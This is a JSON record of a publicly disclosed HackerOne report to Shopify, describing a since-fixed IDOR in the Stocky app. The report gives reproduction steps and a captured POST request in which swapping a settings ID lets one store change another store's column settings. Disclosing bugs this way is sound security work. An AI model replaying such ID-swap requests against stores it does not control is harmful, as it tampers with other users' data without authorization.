{"id":853130,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTMxMzA=","url":"https://hackerone.com/reports/853130","title":"IDOR on stocky application-Low Stock-Varient-Settings-Columns","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-04-18T21:17:48.882Z","submitted_at":"2020-04-18T21:17:48.882Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sreeju_kc","url":"/sreeju_kc","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-07-14T21:18:06.452Z","bug_reporter_agreed_on_going_public_at":"2020-06-25T09:05:40.419Z","team_member_agreed_on_going_public_at":"2020-07-14T21:18:06.357Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\nI have found a IDOR on stocky application Low Stock-Varient-Settings-Columns attribute, in fact malicious user can change the columns of another user.\n\nPOC:\n1)Create two user A and B, login to A and create a store, test.myshopify.com login to user B and create a store test1.myshopify.com\n\n2)Install stocky application on both the store.\n\n3)Go to user A store and click stocky applicaton and that will take you to https://app.stockyhq.com/ and go to https://app.stockyhq.com/dashboard/ and click low stock variants.\n\n4) Go to settings and lick Columns and change the columns settings and turn on the burpsuite and click update, you will recieve below packet.\n\nPOST /settings_for_low_stock_variants/111111 HTTP/1.1\nHost: app.stockyhq.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://app.stockyhq.com/dashboard/low_stock\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 968\nOrigin: https://app.stockyhq.com\nConnection: close\nCookie: \nutf8=%E2%9C%93\u0026_method=put\u0026authenticity_token=HlhsW6AETAE9Mi7pLqJY%2FdE4jVWu53pNWFrVhkhLcoWuT%2FwBK6c2TDrvxWDZiRDRvwaw3DoXzZ7gAatGF4sRww%3D%3D\u0026settings_for_low_stock_variant%5Bshow_grade%5D=0\u0026settings_for_low_stock_variant%5Bshow_product_title%5D=0\u0026settings_for_low_stock_variant%5Bshow_variant_title%5D=0\u0026settings_for_low_stock_variant%5Bshow_sku%5D=0\u0026settings_for_low_stock_variant%5Bshow_lost_per_day%5D=0\u0026settings_for_low_stock_variant%5Bshow_reorder_point%5D=0\u0026settings_for_low_stock_variant%5Bshow_lead_time%5D=0\u0026settings_for_low_stock_variant%5Bshow_need%5D=0\u0026settings_for_low_stock_variant%5Bshow_depletion_days%5D=0\u0026settings_for_low_stock_variant%5Bshow_depletion_date%5D=0\u0026settings_for_low_stock_variant%5Bshow_next_due_date%5D=0\u0026settings_for_low_stock_variant%5Bshow_stock%5D=0\u0026settings_for_low_stock_variant%5Bshow_on_po%5D=0\u0026settings_for_low_stock_variant%5Bshow_on_order%5D=0\u0026settings_for_low_stock_variant%5Bshow_shopify_products_only%5D=0\u0026commit=Update\n\n5) Replace the variants id with user B store variants id the POST request as below.\n\nPOST /settings_for_low_stock_variants/111112 HTTP/1.1\n\n\n6)Send it and you can see 302 message.\n\n7)Go to user B and look at the columns in low variants stock and you can see that the change took in place.\n\n\nNB: Please find the video POC\n\n## Impact\n\nThis is a IDOR, make sure to put in place controls","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":794063,"file_name":"shopifyappidor.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6aLiK7t8G8EjUi6QzgHNWXtZ?response-content-disposition=attachment%3B%20filename%3D%22shopifyappidor.mov%22%3B%20filename%2A%3DUTF-8%27%27shopifyappidor.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153437Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7080d18da6ee227682d6209c1e0678bc7ba6aef911be550b52184838be8a763a","file_size":61668210,"type":"video/quicktime"}],"allow_singular_disclosure_at":null,"vote_count":9,"voters":["drsniper","mik317","mr-hakhak","realtess","what_web","millenniumx","owlone","mr_t0mat0","princejoe7"],"severity":{"rating":"medium","score":4.6,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"high","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":37198,"asset_type":"OTHER","asset_identifier":"Shopify Developed Apps","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7745070,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @sreeju_kc, we haven't forgotten about your report and we are still discussing this with the engineering team. Hopefully we'll have an update tomorrow.","automated_response":false,"created_at":"2020-04-21T21:01:15.124Z","updated_at":"2020-04-21T21:01:15.124Z","actor":{"username":"abdulwahaab_ahmed","cleared":false,"url":"/abdulwahaab_ahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7745196,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @abdulwahaab_ahmed \n\nThanks a lot for the update ","automated_response":false,"created_at":"2020-04-21T21:17:25.393Z","updated_at":"2020-04-21T21:17:25.393Z","actor":{"username":"sreeju_kc","cleared":false,"url":"/sreeju_kc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7759319,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @sreeju_kc, Thank you for your report! We were able to reproduce the issue and our engineering team is working on a fix.","automated_response":false,"created_at":"2020-04-22T20:14:21.023Z","updated_at":"2020-04-22T20:14:21.023Z","actor":{"username":"abdulwahaab_ahmed","cleared":false,"url":"/abdulwahaab_ahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7787574,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for your report. We're awarding a $750 bounty for this issue, which falls into the \"IDOR / Information Disclosure\" category for Non-Core apps. The impact of this bug is relatively low compared to other IDOR bugs, since the \"settings for low stock variants\" functionality only controls how information is presented to the user. However, while investigating your report we did find a second instance of the same bug, so we've decided to award higher than our minimum payout for IDOR bugs.\n\nWe'll be in touch again once the issue is resolved.","automated_response":false,"created_at":"2020-04-24T20:43:08.592Z","updated_at":"2020-04-24T20:43:08.592Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"sreeju_kc","url":"/sreeju_kc"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7815282,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. We recently deployed a fix for this issue. It should no longer be possible to read or write settings belonging to another store.\n\nWe look forward to hearing from you again soon. Happy hacking!","automated_response":false,"created_at":"2020-04-27T21:54:00.104Z","updated_at":"2020-04-27T21:54:00.104Z","actor":{"username":"abdulwahaab_ahmed","cleared":false,"url":"/abdulwahaab_ahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sreeju_kc","url":"/sreeju_kc"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8403923,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-25T09:05:40.454Z","updated_at":"2020-06-25T09:05:40.454Z","first_to_agree":true,"actor":{"username":"sreeju_kc","cleared":false,"url":"/sreeju_kc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8420973,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @abdulwahaab_ahmed \n\nCan we disclose this report please?\n\nRegards","automated_response":false,"created_at":"2020-06-26T16:34:18.205Z","updated_at":"2020-06-26T16:34:18.205Z","actor":{"username":"sreeju_kc","cleared":false,"url":"/sreeju_kc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8599808,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-14T21:18:06.388Z","updated_at":"2020-07-14T21:18:06.388Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8599809,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-07-14T21:18:06.477Z","updated_at":"2020-07-14T21:18:06.477Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}